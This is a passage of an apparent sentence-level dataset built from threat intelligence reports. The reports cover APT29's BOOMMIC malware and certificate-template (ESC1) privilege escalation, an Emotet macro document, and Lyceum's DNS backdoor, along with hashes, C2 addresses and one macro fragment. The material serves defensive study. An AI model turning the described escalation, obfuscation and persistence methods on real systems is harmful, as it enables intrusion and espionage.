        "type": "",
        "report": "r-1011",
        "line": 55,
        "index": 2808
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S56",
        "text": "Analysis of BOOMMIC identified strings throughout the program are encoded using XOR, alternating bytes by 0x0C and 0x4D.\n",
        "type": "",
        "report": "r-1011",
        "line": 56,
        "index": 2809
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S57",
        "text": "If the malware is running under jucheck.exe, it will then create a host id for the compromised target to be used in the request to download a payload.",
        "type": "",
        "report": "r-1011",
        "line": 57,
        "index": 2810
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S58",
        "text": "The host id is created by hex-encoding the DNS domain and legacy account name of the target system.",
        "type": "",
        "report": "r-1011",
        "line": 58,
        "index": 2811
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S59",
        "text": "These values are then formatted in the following manner: <dns_domain>_<account_name>, after both <dns_domain> and <account_name> are encoded by adding 3 to the ordinal of each character.",
        "type": "",
        "report": "r-1011",
        "line": 59,
        "index": 2812
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S60",
        "text": "Once the host id has been created, BOOMMIC passes this value to the function used to download and execute payloads to be used as part of the request.",
        "type": "",
        "report": "r-1011",
        "line": 60,
        "index": 2813
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S61",
        "text": "BOOMMIC then sends a GET request to its C2 to download and execute a shellcode payload.",
        "type": "",
        "report": "r-1011",
        "line": 61,
        "index": 2814
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S62",
        "text": "Mandiant observed APT29 leveraging compromised websites as the C2 for BOOMMIC.",
        "type": "",
        "report": "r-1011",
        "line": 62,
        "index": 2815
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S63",
        "text": "Once a payload is successfully downloaded, BOOMMIC XOR decodes and then executes it in memory.",
        "type": "",
        "report": "r-1011",
        "line": 63,
        "index": 2816
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S64",
        "text": "Mandiant observed APT29 quickly move to escalate their privileges within domains once access was established.",
        "type": "",
        "report": "r-1011",
        "line": 64,
        "index": 2817
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S65",
        "text": "In multiple cases, APT29 was able to gain Domain Admin in less than 12 hours from the initial phishing payload\u2019s execution.",
        "type": "",
        "report": "r-1011",
        "line": 65,
        "index": 2818
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S66",
        "text": "APT29 was observed utilizing a variety of TTPs to escalate their privileges.",
        "type": "",
        "report": "r-1011",
        "line": 66,
        "index": 2819
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S67",
        "text": "In one instance, APT29 was observed writing files that contained Kerberos tickets most likely to be used in Pass the Ticket attacks or for offline cracking.",
        "type": "",
        "report": "r-1011",
        "line": 67,
        "index": 2820
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S68",
        "text": "APT29 was also observed exploiting misconfigured certificate templates to allow them to impersonate admin users.",
        "type": "",
        "report": "r-1011",
        "line": 68,
        "index": 2821
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S69",
        "text": "From here, APT29 created additional malicious certificates which they used to move laterally within the environment.",
        "type": "",
        "report": "r-1011",
        "line": 69,
        "index": 2822
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S70",
        "text": "This recent technique, which is well documented in a report from SpecterOps and was presented at Blackhat in August 2021, gives the attacker the ability to quickly escalate their privileges within the environment, but also provides a method for long term persistence through the creation of malicious certificates.\n",
        "type": "",
        "report": "r-1011",
        "line": 70,
        "index": 2823
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S71",
        "text": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.\n",
        "type": "",
        "report": "r-1011",
        "line": 71,
        "index": 2824
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S72",
        "text": "Microsoft offers \u201cActive Directory Certificate Services\u201d (AD CS) for providing certificate enrollment, revocation and trust setup.",
        "type": "",
        "report": "r-1011",
        "line": 72,
        "index": 2825
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S73",
        "text": "It allows for setting up the \u201cPublic Key Infrastructure\u201d (PKI) needed for issuing certificates for internal HTTPS sites, VPNs, certificate based authentication etc.\n",
        "type": "",
        "report": "r-1011",
        "line": 73,
        "index": 2826
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S74",
        "text": "AD CS will enable the setup of \u201cCertificate Templates\u201d that are used when generating new certificates.",
        "type": "",
        "report": "r-1011",
        "line": 74,
        "index": 2827
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S75",
        "text": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "type": "",
        "report": "r-1011",
        "line": 75,
        "index": 2828
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S76",
        "text": "Related to this specific case of abuse, three distinct settings on a certificate template are important:\n",
        "type": "",
        "report": "r-1011",
        "line": 76,
        "index": 2829
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S77",
        "text": "- Who can request a certificate using the template\n",
        "type": "",
        "report": "r-1011",
        "line": 77,
        "index": 2830
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S78",
        "text": "- What is the allowed usage of a certificate from the template\n",
        "type": "",
        "report": "r-1011",
        "line": 78,
        "index": 2831
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S79",
        "text": "- Is Subject Alternative Names (SAN) allowed\n",
        "type": "",
        "report": "r-1011",
        "line": 79,
        "index": 2832
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S80",
        "text": "- What are the issuance requirements\n",
        "type": "",
        "report": "r-1011",
        "line": 80,
        "index": 2833
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S81",
        "text": "In multiple cases the attacker found certificate templates with \u201cDomain Users\u201d enrollment rights, meaning all users can request the certificate, a usage including \u201cClient Authentication\u201d, meaning the certificate can be used to authenticate users, and a setting allowing the Subject and SAN to be specified by the requester (\u201cENROLLEE_SUPPLIES_SUBJECT\u201d).",
        "type": "",
        "report": "r-1011",
        "line": 81,
        "index": 2834
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S82",
        "text": "When performing authentication to Active Directory with Kerberos using the Public Key Cryptography for Initial Authentication (PKINIT) Kerberos flow, the Domain Controller will verify the SAN against the User Principal Name (UPN) of the authenticating principal.",
        "type": "",
        "report": "r-1011",
        "line": 82,
        "index": 2835
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S83",
        "text": "Therefore, being allowed to specify an arbitrary SAN allows the requester of the certificate to impersonate any principal in the domain.",
        "type": "",
        "report": "r-1011",
        "line": 83,
        "index": 2836
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S84",
        "text": "These settings allowed the attacker to request a certificate with a low privileged account and specify a high-privileged account in the SAN field and use this certificate for authentication.",
        "type": "",
        "report": "r-1011",
        "line": 84,
        "index": 2837
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S85",
        "text": "The practical steps beyond the aforementioned creation of the certificate are to use the certificate with a request for a Ticket Granting Ticket (TGT) and then use that TGT for authentication.",
        "type": "",
        "report": "r-1011",
        "line": 85,
        "index": 2838
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S86",
        "text": "The linked SpecterOps document provides much more detail and additional techniques besides this one example.\n",
        "type": "",
        "report": "r-1011",
        "line": 86,
        "index": 2839
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S87",
        "text": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "type": "",
        "report": "r-1011",
        "line": 87,
        "index": 2840
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S88",
        "text": "The group was also observed conducting on-host reconnaissance looking for credentials.\n",
        "type": "",
        "report": "r-1011",
        "line": 88,
        "index": 2841
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S89",
        "text": "One of the first commands employed by the group was the windows net command.",
        "type": "",
        "report": "r-1011",
        "line": 89,
        "index": 2842
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S90",
        "text": "APT29 was observed using the net command widely to enumerate users and groups.",
        "type": "",
        "report": "r-1011",
        "line": 90,
        "index": 2843
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S91",
        "text": "APT29 was also observed by Mandiant using nltest to enumerate Domain Controllers on the domain:\n",
        "type": "",
        "report": "r-1011",
        "line": 91,
        "index": 2844
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S92",
        "text": "One notable TTP observed by APT29 was the hunting for passwords stored in SYSVOL.",
        "type": "",
        "report": "r-1011",
        "line": 92,
        "index": 2845
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S93",
        "text": "This technique relies on passwords that are stored as part of Group Policy Preferences.",
        "type": "",
        "report": "r-1011",
        "line": 93,
        "index": 2846
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S94",
        "text": "Passwords stored in this way are encrypted using a known scheme that can easily be decrypted.",
        "type": "",
        "report": "r-1011",
        "line": 94,
        "index": 2847
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S95",
        "text": "Microsoft fixed this in MS14-025 which removed the option of configuring Group Policy Preferences with the \u201ccpassword\u201d.",
        "type": "",
        "report": "r-1011",
        "line": 95,
        "index": 2848
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S96",
        "text": "While the patch was issued in 2014 it is still possible to come across systems with passwords stored in Group Policy Preferences, either due to the patch never having been applied or because the patch does not remove existing Group Policy Preferences that contain passwords (as Microsoft does not risk breaking existing functionality).",
        "type": "",
        "report": "r-1011",
        "line": 96,
        "index": 2849
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S97",
        "text": "Mandiant observed APT29 quickly moving laterally within an environment.",
        "type": "",
        "report": "r-1011",
        "line": 97,
        "index": 2850
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S98",
        "text": "To facilitate lateral movement APT29 relied on a combination of malicious certificates used for impersonation of privileged users and SMB BEACON.\n",
        "type": "",
        "report": "r-1011",
        "line": 98,
        "index": 2851
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S99",
        "text": "APT29 was first observed moving laterally after the group was seen staging and deploying SMB BEACON to multiple systems.",
        "type": "",
        "report": "r-1011",
        "line": 99,
        "index": 2852
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S100",
        "text": "To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.",
        "type": "",
        "report": "r-1011",
        "line": 100,
        "index": 2853
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S101",
        "text": "The first evidence of SMB BEACON being deployed was seen through the local staging of a zip file shortly following the successful execution of BOOMMIC.\n",
        "type": "",
        "report": "r-1011",
        "line": 101,
        "index": 2854
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S102",
        "text": "Analysis of SharedReality.dll identified it to be a memory-only dropper written in Go language that decrypts and executes an embedded BEACON payload.",
        "type": "",
        "report": "r-1011",
        "line": 102,
        "index": 2855
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S103",
        "text": "The BEACON payload was identified to be SMB BEACON that communicates over the following named pipe:\n",
        "type": "",
        "report": "r-1011",
        "line": 103,
        "index": 2856
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S104",
        "text": "APT29 was then observed utilizing the impersonation of a privileged user to copy SharedReality.dll to the Temp directory of multiple systems.",
        "type": "",
        "report": "r-1011",
        "line": 104,
        "index": 2857
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S105",
        "text": "The group then deployed it via a scheduled task named SharedRealitySvcDLC which was installed and executed.",
        "type": "",
        "report": "r-1011",
        "line": 105,
        "index": 2858
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S106",
        "text": "After executing the scheduled task, the task was then immediately deleted.",
        "type": "",
        "report": "r-1011",
        "line": 106,
        "index": 2859
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S107",
        "text": "As previously noted, Mandiant has observed the group widely using scheduled tasks, run keys, malicious certificates, and in-memory backdoors, in some cases multiple per system.",
        "type": "",
        "report": "r-1011",
        "line": 107,
        "index": 2860
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S108",
        "text": "The use of these techniques and tools represents the multiple means by which APT29 attempts to maintain access within an environment.",
        "type": "",
        "report": "r-1011",
        "line": 108,
        "index": 2861
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S109",
        "text": "This is further supported by the activity identified by Mandiant that saw APT29 writing zip files that contained Kerberos tickets as well as the creation and most likely exportation of malicious certificates.\n",
        "type": "",
        "report": "r-1011",
        "line": 109,
        "index": 2862
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S110",
        "text": "The totality of the TTPs used by APT29 supports the assessment that APT29's goal in these campaigns is to establish multiple means of long-term access to facilitate intelligence collection for espionage purposes within the targeted diplomatic entities\u2019 victim networks.",
        "type": "",
        "report": "r-1011",
        "line": 110,
        "index": 2863
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S0",
        "text": "The specific sample analyzed below is the ChristmasCard.doc (SHA256: 1D751C9AA079CC2D42D07D7964D5FAE375127EFA6CA1AC2DFECFD481FE796FBC).",
        "type": "",
        "report": "r-1017",
        "line": 0,
        "index": 2864
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S1",
        "text": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "type": "",
        "report": "r-1017",
        "line": 1,
        "index": 2865
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S2",
        "text": "It reveals that a macro is embedded in the document.\n",
        "type": "",
        "report": "r-1017",
        "line": 2,
        "index": 2866
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S3",
        "text": "When a user opens the document, it claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "type": "",
        "report": "r-1017",
        "line": 3,
        "index": 2867
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S4",
        "text": "VBA (Visual Basic for Applications) codes in the embedded macro are given below:\n",
        "type": "",
        "report": "r-1017",
        "line": 4,
        "index": 2868
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S5",
        "text": "The macro includes obfuscated VBA codes to evade security controls.",
        "type": "",
        "report": "r-1017",
        "line": 5,
        "index": 2869
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S6",
        "text": "The most interesting part of the macro is: Interaction.Shell(CleanString(nvTFDMcQuDSt.TextBox1), 15 - 15)\n",
        "type": "",
        "report": "r-1017",
        "line": 6,
        "index": 2870
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S7",
        "text": "In this malicious macro, Interaction.Shell method runs an executable program written in TextBox1.",
        "type": "",
        "report": "r-1017",
        "line": 7,
        "index": 2871
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S8",
        "text": "However, TextBox1 is not seen by the victim, it is hidden in the document.",
        "type": "",
        "report": "r-1017",
        "line": 8,
        "index": 2872
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S9",
        "text": "We used the Debug.Print method to see the content of the Textbox1, and accessed the following code that is executed by the Interaction.Shell method:\n",
        "type": "",
        "report": "r-1017",
        "line": 9,
        "index": 2873
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S10",
        "text": "We see a heavily obfuscated code to make detection difficult, the only clear part of the code is c:\\SzCTnucwEfW\\SbuaBlErrzYpl\\RdPspAGt\\..\\..\\..\\windows\\system32\\cmd.exe.",
        "type": "",
        "report": "r-1017",
        "line": 10,
        "index": 2874
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S11",
        "text": "As seen on this part of the code, three random directories are added after c:\\ to bypass weak security controls, then three \\.. are added to traverse back to c:\\.",
        "type": "",
        "report": "r-1017",
        "line": 11,
        "index": 2875
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S12",
        "text": "Therefore, the obtained path is c:\\windows\\system32\\cmd.exe that runs the subsequent commands.",
        "type": "",
        "report": "r-1017",
        "line": 12,
        "index": 2876
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S13",
        "text": "However, those commands are also obfuscated:\n",
        "type": "",
        "report": "r-1017",
        "line": 13,
        "index": 2877
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S14",
        "text": "The second and third commands are interesting:\n",
        "type": "",
        "report": "r-1017",
        "line": 14,
        "index": 2878
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S15",
        "text": "Briefly, these commands print 497 characters long XhOY variable in reverse order.\n",
        "type": "",
        "report": "r-1017",
        "line": 15,
        "index": 2879
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S16",
        "text": "Let\u2019s look at XhOY variable:\n",
        "type": "",
        "report": "r-1017",
        "line": 16,
        "index": 2880
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S17",
        "text": "And, XhOY variable in reverse order:\n",
        "type": "",
        "report": "r-1017",
        "line": 17,
        "index": 2881
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S18",
        "text": "Now, we can see it is a PowerShell command, but it is obfuscated by using variable substitution and garbage variable assignments.",
        "type": "",
        "report": "r-1017",
        "line": 18,
        "index": 2882
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S19",
        "text": "Even so, we can reveal the following command by removing the garbage variables, and putting the values \u200b\u200bof the variables where they exist.\n",
        "type": "",
        "report": "r-1017",
        "line": 19,
        "index": 2883
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S20",
        "text": "Briefly, this command tries to download 150.exe from the following addresses in given order via the Net.WebClient.DownloadFile method.",
        "type": "",
        "report": "r-1017",
        "line": 20,
        "index": 2884
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S21",
        "text": "Then, if the file is downloaded successfully it executes the downloaded file by using the Invoke-Item cmdlet, and exits the loop.",
        "type": "",
        "report": "r-1017",
        "line": 21,
        "index": 2885
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S22",
        "text": "It differentiates a successful file download by comparing the length of the file with -ge 80000 (ge: greater or equal than).\n",
        "type": "",
        "report": "r-1017",
        "line": 22,
        "index": 2886
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S23",
        "text": "When we started to examine the 150.exe file (SHA256: 5456471B260E664E9485D2CB8321D8E3B3033F700A5BDAAFC94E4BA8046FB87D), we realized that it is the infamous Emotet trojan.",
        "type": "",
        "report": "r-1017",
        "line": 23,
        "index": 2887
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S24",
        "text": "As expected from an Emotet sample, it tries to download a file from the following locations:\n",
        "type": "",
        "report": "r-1017",
        "line": 24,
        "index": 2888
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S25",
        "text": "After a few failed attempts, it downloaded archivesymbol.exe (SHA256: 5DA7A92311FDA255EFAC52C6BFEBCED31BD584453F6BB4F8DE6CDD1B2505B00F) file from 201.190.150.60:443 to C:\\Users\\admin\\AppData\\Local\\archivesymbol\\ folder.",
        "type": "",
        "report": "r-1017",
        "line": 25,
        "index": 2889
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S26",
        "text": "Emotet artifacts usually mimic the names of known executables.",
        "type": "",
        "report": "r-1017",
        "line": 26,
        "index": 2890
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S27",
        "text": "In order to become persistent on the victim system, Archivesymbol.exe adds its full path to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key in the Registry.",
        "type": "",
        "report": "r-1017",
        "line": 27,
        "index": 2891
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S0",
        "text": "During this campaign, the macro-enabled Word document (File name: ir_drones.docm) shown below is downloaded from the domain \u201chttp[:]//news-spot.live\u201d disguising itself as a news report related to military affairs in Iran.",
        "type": "",
        "report": "r-1025",
        "line": 0,
        "index": 2892
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S1",
        "text": "The text of the document is copied from the following original report here: https[:]//www[.]rferl[.]org/a/iran-drone-program-threats-interests/31660048.html\n",
        "type": "",
        "report": "r-1025",
        "line": 1,
        "index": 2893
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S2",
        "text": "Once the user enables the macro content, the following AutoOpen() function is executed which increases picture brightness using \u201cPictureFormat.Brightness = 0.5\u201d revealing content with the headline, \u201cIran Deploys Drones To Target Internal Threat, Protect External Interests.\u201d\n",
        "type": "",
        "report": "r-1025",
        "line": 2,
        "index": 2894
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S3",
        "text": "The threat actor then leverages the AutoClose() function to drop the DNS backdoor onto the system.",
        "type": "",
        "report": "r-1025",
        "line": 3,
        "index": 2895
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S4",
        "text": "Upon closing the document the AutoClose() function is executed, reading a PE file from the text box present on the 7th page of the word document and parsing it further into the required format as shown below with the \u201cMZ\u201d header as the initial two bytes of the byte stream.\n",
        "type": "",
        "report": "r-1025",
        "line": 4,
        "index": 2896
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S5",
        "text": "This PE file is then further written into the Startup folder in order to maintain persistence via the macro code as shown below in the screenshot.",
        "type": "",
        "report": "r-1025",
        "line": 5,
        "index": 2897
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S6",
        "text": "With this tactic, whenever the system is restarted, the DNS Backdoor is executed.\n",
        "type": "",
        "report": "r-1025",
        "line": 6,
        "index": 2898
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S7",
        "text": "The dropped binary is a .NET based DNS Backdoor named \u201cDnsSystem\u201d which allows the threat actors to execute system commands remotely and upload/download data on the infected machine.\n",
        "type": "",
        "report": "r-1025",
        "line": 7,
        "index": 2899
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S8",
        "text": "Below, we analyze the dropped .NET based DNS Backdoor and its inner workings.\n",
        "type": "",
        "report": "r-1025",
        "line": 8,
        "index": 2900
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S9",
        "text": "The Lyceum Group has developed a .NET based DNS Backdoor which has been widely used in the wild in their recent campaigns.",
        "type": "",
        "report": "r-1025",
        "line": 9,
        "index": 2901
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S10",
        "text": "As discussed earlier, the backdoor was dropped in the Startup folder of the infected system from a Macro Enabled Word document.\n",
        "type": "",
        "report": "r-1025",
        "line": 10,
        "index": 2902
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S11",
        "text": "The .NET based DNS Backdoor is a customized version of the Open source tool DIG.net (DnsDig) found here: DNS.NET Resolver (C#) - CodeProject .",
        "type": "",
        "report": "r-1025",
        "line": 11,
        "index": 2903
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S12",
        "text": "DIG.net is an open source DNS Resolver which can be leveraged to perform DNS queries onto the DNS Server and then parse the response.",
        "type": "",
        "report": "r-1025",
        "line": 12,
        "index": 2904
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S13",
        "text": "The threat actors have customized and appended code that allows them to perform DNS queries for various records onto the custom DNS Server, parse the response of the query in order to execute system commands remotely, and upload/download files from the Command & Control server by leveraging the DNS protocol.",
        "type": "",
        "report": "r-1025",
        "line": 13,
        "index": 2905
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S14",
        "text": "Initially the malware sets up an attacker controlled DNS server by acquiring the IP Address of the domain name \u201ccyberclub[.]one\u201d = 85[.]206[.]175[.]199 using Dns.GetHostAddresses() for the DIG Resolver function, which in turn triggers an DNS request to cyberclub[.]one for resolving the IP address.",
        "type": "",
        "report": "r-1025",
        "line": 14,
        "index": 2906
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S15",
        "text": "Now this IP is associated as the custom attacker controlled DNS Server for all the further DNS queries initiated by the malware.",
        "type": "",
        "report": "r-1025",
        "line": 15,
        "index": 2907
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S16",
        "text": "Next, the Form Load function generates a unique BotID depending on the current Windows username.",
        "type": "",
        "report": "r-1025",
        "line": 16,
        "index": 2908
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S17",
        "text": "It converts the username into its MD5 equivalent using the CreateMD5() function, and parses the first 8 bytes of the MD5 as the BotID for the identification of the user and system infected by the malware.\n",
        "type": "",
        "report": "r-1025",
        "line": 17,
        "index": 2909
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S18",
        "text": "Now, the backdoor needs to receive commands from the C2 server in order to perform tasks.",
        "type": "",
        "report": "r-1025",
        "line": 18,
        "index": 2910
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S19",
        "text": "The backdoor sends across an initial DNS query to \u201ctrailers.apple.com\u201d wherein the domain name \u201ctrailers.apple.com\u201d is concatenated with the previously generated BotID before initiation of the DNS request.",
        "type": "",
        "report": "r-1025",
        "line": 19,
        "index": 2911
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S20",
        "text": "The DNS query is then sent to the DNS server in order to fetch the \u201cTXT\u201d records for the provided domain name by passing three arguments to the BeginDigIt() function:\n",
        "type": "",
        "report": "r-1025",
        "line": 20,
        "index": 2912
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S21",
        "text": "The BeginDigIt function then executes the main DNS resolver function \u201cDigIt.\u201d",
        "type": "",
        "report": "r-1025",
        "line": 21,
        "index": 2913
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S22",
        "text": "This sends across the DNS query in order to fetch the DNS record for the provided target domain name to the DNS server, and parses the response as seen in the code snippet below.\n",
        "type": "",
        "report": "r-1025",
        "line": 22,
        "index": 2914
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S23",
        "text": "Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor. .",
        "type": "",
        "report": "r-1025",
        "line": 23,
        "index": 2915
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S24",
        "text": "The malware utilizes a DNS attack technique known as \u201cDNS Hijacking\u201d where in the DNS server is being controlled by the attackers which would allow them to manipulate the response to the DNS queries.",
        "type": "",
        "report": "r-1025",
        "line": 24,
        "index": 2916
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S25",
        "text": "Now let's analyze the DNS Hijacking routine below.\n",
        "type": "",
        "report": "r-1025",
        "line": 25,
        "index": 2917
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S26",
        "text": "As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com.",
        "type": "",
        "report": "r-1025",
        "line": 26,
        "index": 2918
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S27",
        "text": "EF58DF5 is the BotID generated based on the Windows user to receive commands from the C2 server.",
        "type": "",
        "report": "r-1025",
        "line": 27,
        "index": 2919
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S28",
        "text": "As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker-controlled DNS server previously initialized.",
        "type": "",
        "report": "r-1025",
        "line": 28,
        "index": 2920
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S29",
        "text": "Here\u2019s where the DNS hijacking happens: As the malware sends across a DNS query to fetch the TXT records to the attacker-controlled DNS server, the attacker controlled DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig,whoami,uploaddd etc as shown in the screenshot below.\n",
        "type": "",
        "report": "r-1025",
        "line": 29,
        "index": 2921
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S30",
        "text": "Following is the DIG.Net DNS response received by the backdoor and then further parsed in order to execute commands on the infected machine.",
        "type": "",
        "report": "r-1025",
        "line": 30,
        "index": 2922
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S31",
        "text": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "type": "",
        "report": "r-1025",
        "line": 31,
        "index": 2923
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S32",
        "text": "The Answer section consists of the query response, which includes the target Domain name and the response to the TXT record with two values, \u201cipconfig\u201d - command to be executed and \u201c1291\u201d - Communication ID\n",
        "type": "",
        "report": "r-1025",
        "line": 32,
        "index": 2924
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S33",
        "text": "Next, the Dig.net response is parsed using multiple pattern regex code routines which parse out the TXT record values\u2014the aforementioned command and communication ID\u2014from the complete response received by the malware.",
        "type": "",
        "report": "r-1025",
        "line": 33,
        "index": 2925
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S34",
        "text": "Next, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:\n",
        "type": "",
        "report": "r-1025",
        "line": 34,
        "index": 2926
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S35",
        "text": "Download Files -",
        "type": "",
        "report": "r-1025",
        "line": 35,
        "index": 2927
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S36",
        "text": "If the command received from the DNS query consists of a string: \u201cdownloaddd\u201d it initiates the download routine and downloads the file from the URL using DownloadFileAsync().",
        "type": "",
        "report": "r-1025",
        "line": 36,
        "index": 2928
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S37",
        "text": "The URL would be the first 11 bytes of the TXT record response value, and stores that downloaded file in the Downloads folder as shown below in the code snippet.",
        "type": "",
        "report": "r-1025",
        "line": 37,
        "index": 2929
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S38",
        "text": "This functionality can be leveraged to drop additional malware on the infected machine.",
        "type": "",
        "report": "r-1025",
        "line": 38,
        "index": 2930
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S39",
        "text": "Upload Files -",
        "type": "",
        "report": "r-1025",
        "line": 39,
        "index": 2931
    },
    {
